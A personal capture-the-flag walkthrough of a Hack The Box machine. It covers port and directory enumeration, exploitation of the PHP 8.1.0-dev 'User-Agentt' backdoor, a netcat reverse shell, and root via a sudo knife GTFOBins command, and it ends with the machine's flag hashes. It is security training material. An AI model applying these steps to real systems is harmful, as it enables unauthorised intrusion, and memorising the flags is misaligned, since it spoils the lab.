```
Exploit used: 
	-https://www.exploit-db.com/exploits/49933
	-# PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution

Privilege escalation used: 
	-sudo -l
	-gtfobins knife & got insta root.

Lessons learned:
-Pay attention to burpsuite and X-POWERED-BY in the request, I had nothing left once chasing down the web server originally but would have never thought to look at the x-powered-by to see a vulnerable php version.
-Read the scripts that are being used because originally i got into an unprivileged shell which did me no good by just throwing the exploit.
	- Had to go back and modify the burpsuite to get a reverse shell in screenshot #8.

Loot:

cat root.txt
a6cdf14f52c2bbb97926842e949964b5

cat user.txt
35ca886601f05ab7cbbdcf5506b3e936

```

```
31Jan2023

18:35
┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# nmap -Pn -sV -sC 10.10.10.242 

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be549ca367c315c364717f6a534a4c21 (RSA)
|   256 bf8a3fd406e92e874ec97eab220ec0ee (ECDSA)
|_  256 1adea1cc37ce53bb1bfb2b0badb3f684 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
18:37
- browsed to webpage, nothing to click at. still waiting for go buster/dirsearch to come back
	- nothing in robots.txt
```

```
18:45
┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# dirsearch -u http://10.10.10.242:80 -x 400,401,403
Target: http://10.10.10.242:80/

[23:37:18] Starting: 
[23:37:54] 200 -    6KB - /index.php
[23:37:54] 200 -    6KB - /index.php/login/

	-nothing in index.php
	-nothing in login.
	-reran dirsearch with /index.php/login/ - nothing here.

```

```
18:45
https://github.com/thehackersbrain/CVE-2021-41773
	- found an exploit that allows RCE, going to pull it down and try it
	- nvm no im not wrong version
```

```
19:03
-nothing found in gobuster, literally nothing to go on, getting tip from ipsec.rocks
-in burpsuite x-powered-by php version is weird, looking up exploits.
```

![[4 burpsuite x-powered-by.png]]

```
19:06
- looking into this php version
	-# PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution
	-https://www.exploit-db.com/exploits/49933
-Description of exploit:
An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.
The following exploit uses the backdoor to provide a pseudo shell ont the host.
```


![[5 php 8.1.0-dev backdoor exploit.png]]

```
19:14
┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# chmod +x backdoor_php_8.1.0-dev.py 
   
┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# python3 backdoor_php_8.1.0-dev.py 
Enter the full host url:
http://10.10.10.242

Interactive shell is opened on http://10.10.10.242 
Can't acces tty; job crontol turned off.
$ id
uid=1000(james) gid=1000(james) groups=1000(james)

-made backdoor_php_8.1.0-dev.py executable with chmod
-threw exploit and it worked, we are now on as james
```

```
19:17
$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife

-able to run knife with root privileges
```


19:19
```
-Begin manual enumeration
-python -c 'import pty; pty.spawn("/bin/sh")'
	- Could not upgrade shell, cannot cd in current shell
-$ cat /etc/issue
	Ubuntu 20.04.2 LTS \n \l

```

```
19:43
-had to upgrade shell, watched ippsec use the exploit and saw that the line below had to be entered
-had to upgrade shell due to inability to run any commands or do anything as seen in 19:19
```

![[8 burp user agentt exploit shell upgrade.png]]

```
19:46
┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# nc -lvnp 4242                             
listening on [any] 4242 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.242] 49832
bash: cannot set terminal process group (1029): Inappropriate ioctl for device
bash: no job control in this shell
james@knife:/$ id
id
uid=1000(james) gid=1000(james) groups=1000(james)
james@knife:/$ 

-setup nc and caught reverse shell.

```

```
19:51
- used previous sudo -l to know we could run knife
	- gtfo bins knife
	- used command below to get root

james@knife:/$ sudo knife exec -E 'exec "/bin/sh"'
sudo knife exec -E 'exec "/bin/sh"'
id
uid=0(root) gid=0(root) groups=0(root)
```

![[10 gtfo bins knife - priv esc.png]]


```
19:54
# /bin/bash -i  
bash: cannot set terminal process group (1029): Inappropriate ioctl for device
bash: no job control in this shell
root@knife:/#   

- upgraded into better shell
```

![[11 bash shell upgrade.png]]




```
19:56
Loot
root@knife:/home/james# cat user.txt
cat user.txt
35ca886601f05ab7cbbdcf5506b3e936

cat root.txt
a6cdf14f52c2bbb97926842e949964b5

```